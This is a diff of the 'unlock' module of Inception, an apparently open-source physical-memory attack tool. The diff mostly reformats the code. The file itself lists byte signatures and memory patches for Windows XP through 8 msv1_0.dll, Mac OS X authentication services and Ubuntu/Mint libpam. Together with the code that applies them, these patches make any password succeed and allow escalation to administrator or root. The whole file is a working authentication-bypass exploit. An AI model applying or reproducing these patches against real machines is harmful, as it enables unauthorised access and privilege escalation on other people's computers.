@@ -21,14 +21,16 @@ Created on Jun 23, 2011
 
 @author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
 '''
+import sys
+
 from inception import cfg, terminal
 from inception.memory import Target, Signature, Chunk
-import sys
+
 
 term = terminal.Terminal()
 
 info = 'Unlocks the target\'s screensaver or lock screen. After running ' \
-'this module you should be able to log in with any non-blank password.'
+       'this module you should be able to log in with any non-blank password.'
 
 # Target template
 # Target(
@@ -57,469 +59,474 @@ info = 'Unlocks the target\'s screensaver or lock screen. After running ' \
 
 
 targets = [
-Target(
-    name='Windows 8 MsvpPasswordValidate unlock/privilege escalation',
-    note='Ensures that the password-check always returns true. This will '
-    'cause all accounts to no longer require a password, and will also allow '
-    'you to escalate privileges to Administrator via the \'runas\' command.',
-    signatures=[
-        Signature(
-            os='Windows 8',
-            os_versions=['8.0'],
-            os_architectures=['x86'],
-            executable='msv1_0.dll',
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0xde7],
-            chunks=[
-                Chunk(
-                    chunk=0x8bff558bec81ec90000000a1,
-                    chunkoffset=0x00,
-                    patch=0xb001,
-                    patchoffset=0xc1)
-                ]
-            ),
-        Signature(
-            os='Windows 8',
-            os_versions=['8.1'],
-            os_architectures=['x86'],
-            executable='msv1_0.dll',
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0xca0],
-            chunks=[
-                Chunk(
-                    chunk=0x8bff558bec81ec90000000a1,
-                    chunkoffset=0x00,
-                    patch=0x909090909090,
-                    patchoffset=0xb3)
-                ]
-            ),
-        Signature(
-            os='Windows 8',
-            os_versions=['8.0', '8.1'],
-            os_architectures=['x64'],
-            executable='msv1_0.dll',
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0x208, 0xd78],
-            chunks=[
-                Chunk(
-                    chunk=0xc60f85,
-                    chunkoffset=0x00,
-                    patch=0x909090909090,
-                    patchoffset=0x01),
-                Chunk(
-                    chunk=0x66b80100,
-                    chunkoffset=0x07,
-                    patch=None,
-                    patchoffset=0x00)
-                ]
-            )
-        ]
-    ),
-Target(
-    name='Windows 7 MsvpPasswordValidate unlock/privilege escalation',
-    note='NOPs out the jump that is called if passwords doesn\'t match. This '
-    'will cause all accounts to no longer require a password, and will also '
-    'allow you to escalate privileges to Administrator via the \'runas\' '
-    'command. Note: As the patch stores the LANMAN/NTLM hash of the entered '
-    'password, the account will be locked out of any Windows AD domain '
-    'he/she was member of at this machine.',
-    signatures=[
-        Signature(
-            os='Windows 7',
-            os_versions=['SP0', 'SP1'],
-            os_architectures=['x64'],
-            executable='msv1_0.dll',
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0x2a8, 0x2a1, 0x291, 0x321],
-            chunks=[
-                Chunk(
-                    chunk=0xc60f85,
-                    chunkoffset=0x00,
-                    patch=0x909090909090,
-                    patchoffset=0x01),
-                Chunk(
-                    chunk=0xb8,
-                    chunkoffset=0x07,
-                    patch=None,
-                    patchoffset=0x00)
-                ]
-            ),
-        Signature(
-            os='Windows 7',
-            os_versions=['SP0'],
-            os_architectures=['x86'],
-            executable='msv1_0.dll',
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0x926],
-            chunks=[
-                Chunk(
-                    chunk=0x83f8107513b0018b,
-                    chunkoffset=0x00,
-                    patch=0x83f8109090b0018b,
-                    patchoffset=0x00)
-                ]
-            ),
-        Signature(
-            os='Windows 7',
-            os_versions=['SP1'],
-            os_architectures=['x86'],
-            executable='msv1_0.dll',
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0x312],
-            chunks=[
-                Chunk(
-                    chunk=0x83f8100f8550940000b0018b,
-                    chunkoffset=0x00,
-                    patch=0x83f810909090909090b0018b,
-                    patchoffset=0x00)
-                ]
-            )
-        ]
-    ),
-Target(
-    name='Windows Vista MsvpPasswordValidate unlock/privilege escalation',
-    note='NOPs out the jump that is called if passwords doesn\'t match. This '
-    'will cause all accounts to no longer require a password, and will also '
-    'allow you to escalate privileges to Administrator via the \'runas\' '
-    'command. Note: As the patch stores the LANMAN/NTLM hash of the entered '
-    'password, the account will be locked out of any Windows AD domain '
-    'he/she was member of at this machine.',
-    signatures=[
-        Signature(
-            os='Windows Vista',
-            os_versions=['SP2'],
-            os_architectures=['x64'],
-            executable='msv1_0.dll',
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0x1a1],
-            chunks=[
-                Chunk(
-                    chunk=0xc60f85,
-                    chunkoffset=0x00,
-                    patch=0x909090909090,
-                    patchoffset=0x01),
-                Chunk(
-                    chunk=0xb8,
-                    chunkoffset=0x07,
-                    patch=None,
-                    patchoffset=0x00)
-                ]
-            ),
-        Signature(
-            os='Windows Vista',
-            os_versions=['SP0', 'SP1', 'SP2'],
-            os_architectures=['x86'],
-            executable='msv1_0.dll',
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0x432, 0x80f, 0x74a],
-            chunks=[
-                Chunk(
-                    chunk=0x83f8107513b0018b,
-                    chunkoffset=0x00,
-                    patch=0x83f8109090b0018b,
-                    patchoffset=0x00)
-                ]
-            )
-        ]
-    ),
-Target(
-    name='Windows XP MsvpPasswordValidate unlock/privilege escalation',
-    note='NOPs out the jump that is called if passwords doesn\'t match. '
-    'This will cause all accounts to no longer require a password, and '
-    'will also allow you to escalate privileges to Administrator via the '
-    '\'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of '
-    'the entered password, the account will be locked out of any Windows '
-    'AD domain he/she was member of at this machine.',
-    signatures=[
-        Signature(
-            offsets=[0x862, 0x8aa, 0x946, 0x126, 0x9b6],
-            os='Windows XP',
-            os_versions=['SP2', 'SP3'],
-            os_architectures=['x86'],
-            executable='msv1_0.dll',
-            version=None,
-            md5=None,
-            tag=False,
-            chunks=[
-                Chunk(
-                    chunk=0x83f8107511b0018b,
-                    chunkoffset=0x00,
-                    patch=0x83f8109090b0018b,
-                    patchoffset=0x00)
-                ]
-            )
-        ]
-    ),
-Target(
-    name='Mac OS X DirectoryService/OpenDirectory unlock/privilege escalation',
-    note='Overwrites the DoShadowHashAuth/ODRecordVerifyPassword return '
-    'value. After running, all local authentications (e.g., GUI, sudo, etc.) '
-    'will work with all non-blank passwords',
-    signatures=[
-        Signature(
-            os='Mac OS X',
-            os_versions=['10.6.4'],
-            os_architectures=['x64'],
-            executable=None,
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0x7cf],
-            chunks=[
-                Chunk(
-                    chunk=0x41bff6c8ffff48c78588,
-                    chunkoffset=0x00,
-                    patch=0x41bf0000000048c78588,
-                    patchoffset=0x00)
-                ]
-            ),
-        Signature(
-            os='Mac OS X',
-            os_versions=['10.6.8'],
-            os_architectures=['x64'],
-            executable=None,
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0xbff],
-            chunks=[
-                Chunk(
-                    chunk=0x41bff6c8ffff,
-                    chunkoffset=0x00,
-                    patch=0x41bf00000000,
-                    patchoffset=0x00)
-                ]
-            ),
-        Signature(
-            os='Mac OS X',
-            os_versions=['10.6.8'],
-            os_architectures=['x86'],
-            executable=None,
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0x82f],
-            chunks=[
-                Chunk(
-                    chunk=0xc78580f6fffff6c8ffff,
-                    chunkoffset=0x00,
-                    patch=0xc78580f6ffff00000000,
-                    patchoffset=0x00)
-                ]
-            ),
-        Signature(
-            os='Mac OS X',
-            os_versions=['10.7.3'],
-            os_architectures=['x64'],
-            executable=None,
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0xfa7],
-            chunks=[
-                Chunk(
-                    chunk=0x0fb6,
-                    chunkoffset=0x00,
-                    patch=0x31dbffc3, # xor ebx,ebx; inc ebx;
-                    patchoffset=0x00),
-                Chunk(
-                    chunk=0x89d8eb0231c04883c4785b415c415d415e415f5dc3,
-                    chunkoffset=0x0e,
-                    patch=None,
-                    patchoffset=0x00)
-                ]
-            ),
-        Signature(
-            os='Mac OS X',
-            os_versions=['10.8.2', '10.8.3', '10.8.4'],
-            os_architectures=['x64'],
-            executable=None,
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0x334],
-            chunks=[
-                Chunk(
-                    chunk=0x88d84883c4685b415c415d415e415f5d,
-                    chunkoffset=0x00,
-                    patch=0xb001, # mov al,1;
-                    patchoffset=0x00)
-                ]
-            ),
-        Signature(
-            os='Mac OS X',
-            os_versions=['10.9'],
-            os_architectures=['x64'],
-            executable=None,
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0x1e5],
-            chunks=[
-                Chunk(
-                    chunk=0x4488e84883c4685b415c415d415e415f5d,
-                    chunkoffset=0x00,
-                    patch=0x90b001, # nop; mov al,1;
-                    patchoffset=0x00)
-                ]
-            )
-        ]
-    ),
-Target(
-    name='Ubuntu libpam unlock/privilege escalation',
-    note='Overwrites the pam_authenticate return value. After running, all '
-    'PAM-based authentications (e.g., GUI, tty and sudo) will work with no '
-    'password.',
-    signatures=[
-        Signature(
-            os='Ubuntu',
-            os_versions=['10.10', '10.04', '11.10', '11.04', '12.04'],
-            os_architectures=['x86'],
-            executable=None,
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0xa6d, 0xebd, 0x9ed, 0xbaf, 0xa7f],
-            chunks=[
-                Chunk(
-                    chunk=0x83f81f89c774,
-                    chunkoffset=0x00,
-                    patch=0xbf00000000eb,
-                    patchoffset=0x00)
-                ]
-            ),
-        Signature(
-            os='Ubuntu',
-            os_versions=['12.10', '13.04', '13.10'],
-            os_architectures=['x86'],
-            executable=None,
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0xb46, 0xcae, 0xc95],
-            chunks=[
-                Chunk(
-                    chunk=0xe8,
-                    chunkoffset=0x00,
-                    patch=None,
-                    patchoffset=0x00),
-                Chunk(
-                    chunk=0x83f81f,
-                    chunkoffset=0x05,
-                    patch=0x9031c0, # nop; xor eax,eax
-                    patchoffset=0x00)
-                ]
-            ),
-        Signature(
-            os='Ubuntu',
-            os_versions=['11.10', '11.04', '12.04'],
-            os_architectures=['x64'],
-            executable=None,
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0x838, 0x5b8, 0x3c8],
-            chunks=[
-                Chunk(
-                    chunk=0x83f81f89c574,
-                    chunkoffset=0x00,
-                    patch=0xbd00000000eb,
-                    patchoffset=0x00)
-                ]
-            ),
-        Signature(
-            os='Ubuntu',
-            os_versions=['12.10', '13.04', '13.10'],
-            os_architectures=['x64'],
-            executable=None,
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0x4aa, 0x69b, 0x688],
-            chunks=[
-                Chunk(
-                    chunk=0xe8,
-                    chunkoffset=0x00,
-                    patch=None,
-                    patchoffset=0x00),
-                Chunk(
-                    chunk=0x83f81f,
-                    chunkoffset=0x05,
-                    patch=0x6631c0, # xor eax,eax
-                    patchoffset=0x00)
-                ]
-            )
-        ]
-    ),
-Target(
-    name='Linux Mint libpam unlock/privilege escalation',
-    note='Overwrites the pam_authenticate return value. After running, all '
-    'PAM-based authentications (e.g., GUI, tty and sudo) will work with no '
-    'password.',
-    signatures=[
-        Signature(
-            os='Linux Mint',
-            os_versions=['11', '12', '13'],
-            os_architectures=['x86'],
-            executable=None,
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0xebd, 0xbaf, 0xa7f],
-            chunks=[
-                Chunk(
-                    chunk=0x83f81f89c774,
-                    chunkoffset=0x00,
-                    patch=0xbf00000000eb,
-                    patchoffset=0x00)
-                ]
-            ),
-        Signature(
-            os='Linux Mint',
-            os_versions=['11', '12', '13'],
-            os_architectures=['x64'],
-            executable=None,
-            version=None,
-            md5=None,
-            tag=False,
-            offsets=[0x838, 0x5b8, 0x3c8],
-            chunks=[
-                Chunk(
-                    chunk=0x83f81f89c574,
-                    chunkoffset=0x00,
-                    patch=0xbd00000000eb,
-                    patchoffset=0x00)
-                ]
-            )
-        ]
-    )
-]
+    Target(
+        name='Windows 8 MsvpPasswordValidate unlock/privilege escalation',
+        note='Ensures that the password-check always returns true. This will '
+        'cause all accounts to no longer require a password, and will '
+        'also allow you to escalate privileges to Administrator via the '
+        '\'runas\' command.',
+        signatures=[
+            Signature(
+                os='Windows 8',
+                os_versions=['8.0'],
+                os_architectures=['x86'],
+                executable='msv1_0.dll',
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0xde7],
+                chunks=[
+                    Chunk(
+                        chunk=0x8bff558bec81ec90000000a1,
+                        chunkoffset=0x00,
+                        patch=0xb001,
+                        patchoffset=0xc1)
+                    ]
+                ),
+            Signature(
+                os='Windows 8',
+                os_versions=['8.1'],
+                os_architectures=['x86'],
+                executable='msv1_0.dll',
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0xca0],
+                chunks=[
+                    Chunk(
+                        chunk=0x8bff558bec81ec90000000a1,
+                        chunkoffset=0x00,
+                        patch=0x909090909090,
+                        patchoffset=0xb3)
+                    ]
+                ),
+            Signature(
+                os='Windows 8',
+                os_versions=['8.0', '8.1'],
+                os_architectures=['x64'],
+                executable='msv1_0.dll',
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0x208, 0xd78],
+                chunks=[
+                    Chunk(
+                        chunk=0xc60f85,
+                        chunkoffset=0x00,
+                        patch=0x909090909090,
+                        patchoffset=0x01),
+                    Chunk(
+                        chunk=0x66b80100,
+                        chunkoffset=0x07,
+                        patch=None,
+                        patchoffset=0x00)
+                    ]
+                )
+            ]
+        ),
+    Target(
+        name='Windows 7 MsvpPasswordValidate unlock/privilege escalation',
+        note='NOPs out the jump that is called if passwords doesn\'t match. '
+        'This will cause all accounts to no longer require a password, '
+        'and will also allow you to escalate privileges to Administrator '
+        'via the \'runas\' command. Note: As the Windows stores the '
+        'LANMAN/NTLM hash of the entered password, the account will be '
+        'locked out of any Windows AD domain he/she was member of at '
+        'this machine.',
+        signatures=[
+            Signature(
+                os='Windows 7',
+                os_versions=['SP0', 'SP1'],
+                os_architectures=['x64'],
+                executable='msv1_0.dll',
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0x2a8, 0x2a1, 0x291, 0x321],
+                chunks=[
+                    Chunk(
+                        chunk=0xc60f85,
+                        chunkoffset=0x00,
+                        patch=0x909090909090,
+                        patchoffset=0x01),
+                    Chunk(
+                        chunk=0xb8,
+                        chunkoffset=0x07,
+                        patch=None,
+                        patchoffset=0x00)
+                    ]
+                ),
+            Signature(
+                os='Windows 7',
+                os_versions=['SP0'],
+                os_architectures=['x86'],
+                executable='msv1_0.dll',
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0x926],
+                chunks=[
+                    Chunk(
+                        chunk=0x83f8107513b0018b,
+                        chunkoffset=0x00,
+                        patch=0x83f8109090b0018b,
+                        patchoffset=0x00)
+                    ]
+                ),
+            Signature(
+                os='Windows 7',
+                os_versions=['SP1'],
+                os_architectures=['x86'],
+                executable='msv1_0.dll',
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0x312],
+                chunks=[
+                    Chunk(
+                        chunk=0x83f8100f8550940000b0018b,
+                        chunkoffset=0x00,
+                        patch=0x83f810909090909090b0018b,
+                        patchoffset=0x00)
+                    ]
+                )
+            ]
+        ),
+    Target(
+        name='Windows Vista MsvpPasswordValidate unlock/privilege escalation',
+        note='NOPs out the jump that is called if passwords doesn\'t match. '
+        'This will cause all accounts to no longer require a password, '
+        'and will also allow you to escalate privileges to Administrator '
+        'via the \'runas\' command. Note: As the patch stores the '
+        'LANMAN/NTLM hash of the entered password, the account will be '
+        'locked out of any Windows AD domain he/she was member of at '
+        'this machine.',
+        signatures=[
+            Signature(
+                os='Windows Vista',
+                os_versions=['SP2'],
+                os_architectures=['x64'],
+                executable='msv1_0.dll',
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0x1a1],
+                chunks=[
+                    Chunk(
+                        chunk=0xc60f85,
+                        chunkoffset=0x00,
+                        patch=0x909090909090,
+                        patchoffset=0x01),
+                    Chunk(
+                        chunk=0xb8,
+                        chunkoffset=0x07,
+                        patch=None,
+                        patchoffset=0x00)
+                    ]
+                ),
+            Signature(
+                os='Windows Vista',
+                os_versions=['SP0', 'SP1', 'SP2'],
+                os_architectures=['x86'],
+                executable='msv1_0.dll',
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0x432, 0x80f, 0x74a],
+                chunks=[
+                    Chunk(
+                        chunk=0x83f8107513b0018b,
+                        chunkoffset=0x00,
+                        patch=0x83f8109090b0018b,
+                        patchoffset=0x00)
+                    ]
+                )
+            ]
+        ),
+    Target(
+        name='Windows XP MsvpPasswordValidate unlock/privilege escalation',
+        note='NOPs out the jump that is called if passwords doesn\'t match. '
+        'This will cause all accounts to no longer require a password, '
+        'and will also allow you to escalate privileges to Administrator '
+        'via the \'runas\' command. Note: As the patch stores the '
+        'LANMAN/NTLM hash of the entered password, the account will be '
+        'locked out of any Windows AD domain he/she was member of at '
+        'this machine.',
+        signatures=[
+            Signature(
+                offsets=[0x862, 0x8aa, 0x946, 0x126, 0x9b6],
+                os='Windows XP',
+                os_versions=['SP2', 'SP3'],
+                os_architectures=['x86'],
+                executable='msv1_0.dll',
+                version=None,
+                md5=None,
+                tag=False,
+                chunks=[
+                    Chunk(
+                        chunk=0x83f8107511b0018b,
+                        chunkoffset=0x00,
+                        patch=0x83f8109090b0018b,
+                        patchoffset=0x00)
+                    ]
+                )
+            ]
+        ),
+    Target(
+        name='Mac OS X DirectoryService/OpenDirectory unlock/privilege '
+        'escalation',
+        note='Overwrites the DoShadowHashAuth/ODRecordVerifyPassword return '
+        'value. After running, all local authentications (e.g., GUI, sudo, '
+        'etc.) will work with all non-blank passwords',
+        signatures=[
+            Signature(
+                os='Mac OS X',
+                os_versions=['10.6.4'],
+                os_architectures=['x64'],
+                executable=None,
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0x7cf],
+                chunks=[
+                    Chunk(
+                        chunk=0x41bff6c8ffff48c78588,
+                        chunkoffset=0x00,
+                        patch=0x41bf0000000048c78588,
+                        patchoffset=0x00)
+                    ]
+                ),
+            Signature(
+                os='Mac OS X',
+                os_versions=['10.6.8'],
+                os_architectures=['x64'],
+                executable=None,
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0xbff],
+                chunks=[
+                    Chunk(
+                        chunk=0x41bff6c8ffff,
+                        chunkoffset=0x00,
+                        patch=0x41bf00000000,
+                        patchoffset=0x00)
+                    ]
+                ),
+            Signature(
+                os='Mac OS X',
+                os_versions=['10.6.8'],
+                os_architectures=['x86'],
+                executable=None,
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0x82f],
+                chunks=[
+                    Chunk(
+                        chunk=0xc78580f6fffff6c8ffff,
+                        chunkoffset=0x00,
+                        patch=0xc78580f6ffff00000000,
+                        patchoffset=0x00)
+                    ]
+                ),
+            Signature(
+                os='Mac OS X',
+                os_versions=['10.7.3'],
+                os_architectures=['x64'],
+                executable=None,
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0xfa7],
+                chunks=[
+                    Chunk(
+                        chunk=0x0fb6,
+                        chunkoffset=0x00,
+                        patch=0x31dbffc3,  # xor ebx,ebx; inc ebx;
+                        patchoffset=0x00),
+                    Chunk(
+                        chunk=0x89d8eb0231c04883c4785b415c415d415e415f5dc3,
+                        chunkoffset=0x0e,
+                        patch=None,
+                        patchoffset=0x00)
+                    ]
+                ),
+            Signature(
+                os='Mac OS X',
+                os_versions=['10.8.2', '10.8.3', '10.8.4'],
+                os_architectures=['x64'],
+                executable=None,
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0x334],
+                chunks=[
+                    Chunk(
+                        chunk=0x88d84883c4685b415c415d415e415f5d,
+                        chunkoffset=0x00,
+                        patch=0xb001,  # mov al,1;
+                        patchoffset=0x00)
+                    ]
+                ),
+            Signature(
+                os='Mac OS X',
+                os_versions=['10.9'],
+                os_architectures=['x64'],
+                executable=None,
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0x1e5],
+                chunks=[
+                    Chunk(
+                        chunk=0x4488e84883c4685b415c415d415e415f5d,
+                        chunkoffset=0x00,
+                        patch=0x90b001,  # nop; mov al,1;
+                        patchoffset=0x00)
+                    ]
+                )
+            ]
+        ),
+    Target(
+        name='Ubuntu libpam unlock/privilege escalation',
+        note='Overwrites the pam_authenticate return value. After running, '
+        'all PAM-based authentications (e.g., GUI, tty and sudo) will work '
+        'with no password.',
+        signatures=[
+            Signature(
+                os='Ubuntu',
+                os_versions=['10.10', '10.04', '11.10', '11.04', '12.04'],
+                os_architectures=['x86'],
+                executable=None,
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0xa6d, 0xebd, 0x9ed, 0xbaf, 0xa7f],
+                chunks=[
+                    Chunk(
+                        chunk=0x83f81f89c774,
+                        chunkoffset=0x00,
+                        patch=0xbf00000000eb,
+                        patchoffset=0x00)
+                    ]
+                ),
+            Signature(
+                os='Ubuntu',
+                os_versions=['12.10', '13.04', '13.10'],
+                os_architectures=['x86'],
+                executable=None,
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0xb46, 0xcae, 0xc95],
+                chunks=[
+                    Chunk(
+                        chunk=0xe8,
+                        chunkoffset=0x00,
+                        patch=None,
+                        patchoffset=0x00),
+                    Chunk(
+                        chunk=0x83f81f,
+                        chunkoffset=0x05,
+                        patch=0x9031c0,  # nop; xor eax,eax
+                        patchoffset=0x00)
+                    ]
+                ),
+            Signature(
+                os='Ubuntu',
+                os_versions=['11.10', '11.04', '12.04'],
+                os_architectures=['x64'],
+                executable=None,
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0x838, 0x5b8, 0x3c8],
+                chunks=[
+                    Chunk(
+                        chunk=0x83f81f89c574,
+                        chunkoffset=0x00,
+                        patch=0xbd00000000eb,
+                        patchoffset=0x00)
+                    ]
+                ),
+            Signature(
+                os='Ubuntu',
+                os_versions=['12.10', '13.04', '13.10'],
+                os_architectures=['x64'],
+                executable=None,
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0x4aa, 0x69b, 0x688],
+                chunks=[
+                    Chunk(
+                        chunk=0xe8,
+                        chunkoffset=0x00,
+                        patch=None,
+                        patchoffset=0x00),
+                    Chunk(
+                        chunk=0x83f81f,
+                        chunkoffset=0x05,
+                        patch=0x6631c0,  # xor eax,eax
+                        patchoffset=0x00)
+                    ]
+                )
+            ]
+        ),
+    Target(
+        name='Linux Mint libpam unlock/privilege escalation',
+        note='Overwrites the pam_authenticate return value. After running, '
+        'all PAM-based authentications (e.g., GUI, tty and sudo) will work '
+        'with no password.',
+        signatures=[
+            Signature(
+                os='Linux Mint',
+                os_versions=['11', '12', '13'],
+                os_architectures=['x86'],
+                executable=None,
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0xebd, 0xbaf, 0xa7f],
+                chunks=[
+                    Chunk(
+                        chunk=0x83f81f89c774,
+                        chunkoffset=0x00,
+                        patch=0xbf00000000eb,
+                        patchoffset=0x00)
+                    ]
+                ),
+            Signature(
+                os='Linux Mint',
+                os_versions=['11', '12', '13'],
+                os_architectures=['x64'],
+                executable=None,
+                version=None,
+                md5=None,
+                tag=False,
+                offsets=[0x838, 0x5b8, 0x3c8],
+                chunks=[
+                    Chunk(
+                        chunk=0x83f81f89c574,
+                        chunkoffset=0x00,
+                        patch=0xbd00000000eb,
+                        patchoffset=0x00)
+                    ]
+                )
+            ]
+        )
+    ]
 
 
 def add_options(parser):
-    parser.add_option('-l', '--list', action='store_true', 
-        dest='list_targets',
-        help='list available targets.')
-    parser.add_option('-r', '--revert', action='store_true', 
-        dest='revert', help='revert patch after use.')
-    parser.add_option('-t', '--target-number', 
-        dest='target_number', help='specify a target number.')
+    parser.add_option('-l', '--list', action='store_true',
+                      dest='list_targets',
+                      help='list available targets.')
+    parser.add_option('-r', '--revert', action='store_true',
+                      dest='revert', help='revert patch after use.')
+    parser.add_option('-t', '--target-number',
+                      dest='target_number', help='specify a target number.')
 
 
 def select_target(targets, selected=False):
@@ -535,15 +542,17 @@ def select_target(targets, selected=False):
     try:
         selected = int(selected)
     except:
-        if selected == 'q': sys.exit()
+        if selected == 'q':
+            sys.exit()
         else:
-            term.warn('Invalid selection, please try again. Type \'q\' to quit')
+            term.warn('Invalid selection, please try again. Enter \'q\' to '
+                      'quit')
             return select_target(targets)
     if 0 < selected <= nof_targets:
         return targets[selected - 1]
     else:
-        term.warn('Please enter a selection between 1 and ' + str(nof_targets) + 
-                  '. Type \'q\' to quit')
+        term.warn('Please enter a selection between 1 and {0}. Type \'q\' '
+                  'to quit'.format(nof_targets))
         return select_target(targets)
 
     
@@ -570,10 +579,11 @@ def run(opts, memspace):
     target = select_target(targets, selected=opts.target_number)
     term.info('Selected target: ' + target.name)
     
-    address, signature, offset, chunks = memspace.find(target).pop() # Todo:fix
+    #  TODO:fix
+    address, signature, offset, chunks = memspace.find(target).pop()
     
     # Signature found, let's patch
-    mask = 0xfffff000 # Mask away the lower bits to find the page number
+    mask = 0xfffff000  # Mask away the lower bits to find the page number
     page = int((address & mask) / cfg.PAGESIZE)
     term.info('Signature found at {0:#x} in page no. {1}'
         .format(address, page))
@@ -586,7 +596,7 @@ def run(opts, memspace):
             term.fail('Write-back could not be verified; patching *may* ' +
                       'have been unsuccessful')
 
-        if opts.revert: # TODO: Check that this works
+        if opts.revert:  # TODO: Check that this works
             term.poll('Press [enter] to revert the patch:')
             memspace.write(address, backup)
 
@@ -596,5 +606,3 @@ def run(opts, memspace):
                 term.warn('Revert patch could not be verified')
     
     return address, page
-
-
